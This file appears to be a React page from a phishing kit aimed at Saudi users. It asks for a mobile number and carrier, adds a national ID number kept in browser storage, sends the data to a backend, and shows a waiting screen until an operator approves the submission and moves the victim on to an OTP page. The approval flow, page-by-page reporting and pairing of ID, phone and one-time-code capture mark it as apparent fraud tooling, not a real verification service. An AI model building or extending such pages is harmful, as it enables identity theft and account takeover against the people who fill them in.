@@ -1,0 +1,185 @@
+import { useEffect, useState } from "react";
+import { useForm } from "react-hook-form";
+import { zodResolver } from "@hookform/resolvers/zod";
+import { z } from "zod";
+import { useLocation } from "wouter";
+import PageLayout from "@/components/layout/PageLayout";
+import WaitingOverlay from "@/components/WaitingOverlay";
+import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
+import {
+  Select,
+  SelectContent,
+  SelectItem,
+  SelectTrigger,
+  SelectValue,
+} from "@/components/ui/select";
+import {
+  sendData,
+  isFormApproved,
+  isFormRejected,
+  navigateToPage,
+} from "@/lib/store";
+
+const serviceProviders = [
+  { value: "0", label: "STC", icon: "/images/service-providers/1.png" },
+  { value: "1", label: "موبايلي", icon: "/images/service-providers/2.png" },
+  { value: "2", label: "زين", icon: "/images/service-providers/3.png" },
+  { value: "3", label: "ليبارا", icon: "/images/service-providers/4.png" },
+  { value: "4", label: "فيرجن", icon: "/images/service-providers/5.png" },
+  { value: "5", label: "سلام", icon: "/images/service-providers/6.png" },
+];
+
+const schema = z.object({
+  phone: z
+    .string()
+    .min(1, "رقم الجوال مطلوب")
+    .regex(/^05\d{8}$/, "رقم الجوال غير صحيح"),
+  serviceProvider: z.string().min(1, "مزود الخدمة مطلوب"),
+});
+
+type FormData = z.infer<typeof schema>;
+
+export default function PhoneVerification() {
+  const [, navigate] = useLocation();
+  const [selectedProvider, setSelectedProvider] = useState("");
+
+  const {
+    register,
+    handleSubmit,
+    setValue,
+    reset,
+    formState: { errors },
+  } = useForm<FormData>({
+    resolver: zodResolver(schema),
+    defaultValues: {
+      phone: "",
+      serviceProvider: "",
+    },
+  });
+
+  // Emit page enter
+  useEffect(() => {
+    navigateToPage("توثيق رقم الجوال");
+  }, []);
+
+  // Handle form approval
+  useEffect(() => {
+    if (isFormApproved.value) {
+      navigate(`/phone-otp?serviceProvider=${selectedProvider}`);
+    }
+  }, [isFormApproved.value, navigate, selectedProvider]);
+
+  // Handle form rejection
+  useEffect(() => {
+    if (isFormRejected.value) {
+      reset();
+    }
+  }, [isFormRejected.value, reset]);
+
+  const onSubmit = (data: FormData) => {
+    const idNumber = localStorage.getItem("idNumber") || "";
+    const providerName = serviceProviders.find(
+      (p) => p.value === data.serviceProvider
+    )?.label;
+
+    sendData({
+      data: {
+        "رقم الجوال": data.phone,
+        "مزود الخدمة": providerName,
+        "رقم الهوية": idNumber,
+      },
+      current: "توثيق رقم الجوال",
+      nextPage: `تحقق رقم الجوال (OTP)?serviceProvider=${data.serviceProvider}`,
+    });
+  };
+
+  return (
+    <PageLayout variant="default">
+      <WaitingOverlay />
+
+      <div className="bg-white rounded-2xl shadow-xl p-6">
+        {/* Header */}
+        <div className="text-center mb-8">
+          <div className="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-4">
+            <svg
+              className="w-8 h-8 text-primary"
+              fill="none"
+              stroke="currentColor"
+              viewBox="0 0 24 24"
+            >
+              <path
+                strokeLinecap="round"
+                strokeLinejoin="round"
+                strokeWidth={2}
+                d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"
+              />
+            </svg>
+          </div>
+          <h1 className="text-xl font-bold text-gray-800 mb-2">توثيق رقم الجوال</h1>
+          <p className="text-gray-500 text-sm">
+            أدخل رقم جوالك لإرسال رمز التحقق
+          </p>
+        </div>
+
+        <form onSubmit={handleSubmit(onSubmit)} className="space-y-4">
+          {/* Phone Number */}
+          <div className="space-y-2">
+            <Label htmlFor="phone">رقم الجوال</Label>
+            <Input
+              id="phone"
+              type="tel"
+              inputMode="numeric"
+              placeholder="05xxxxxxxx"
+              maxLength={10}
+              {...register("phone")}
+            />
+            {errors.phone && (
+              <p className="text-red-500 text-xs">{errors.phone.message}</p>
+            )}
+          </div>
+
+          {/* Service Provider */}
+          <div className="space-y-2">
+            <Label>مزود الخدمة</Label>
+            <Select
+              onValueChange={(v) => {
+                setValue("serviceProvider", v);
+                setSelectedProvider(v);
+              }}
+            >
+              <SelectTrigger>
+                <SelectValue placeholder="اختر مزود الخدمة" />
+              </SelectTrigger>
+              <SelectContent>
+                {serviceProviders.map((provider) => (
+                  <SelectItem key={provider.value} value={provider.value}>
+                    <div className="flex items-center gap-2">
+                      <img
+                        src={provider.icon}
+                        alt={provider.label}
+                        className="w-5 h-5"
+                      />
+                      <span>{provider.label}</span>
+                    </div>
+                  </SelectItem>
+                ))}
+              </SelectContent>
+            </Select>
+            {errors.serviceProvider && (
+              <p className="text-red-500 text-xs">
+                {errors.serviceProvider.message}
+              </p>
+            )}
+          </div>
+
+          {/* Submit Button */}
+          <Button type="submit" className="w-full" size="lg">
+            إرسال رمز التحقق
+          </Button>
+        </form>
+      </div>
+    </PageLayout>
+  );
+}
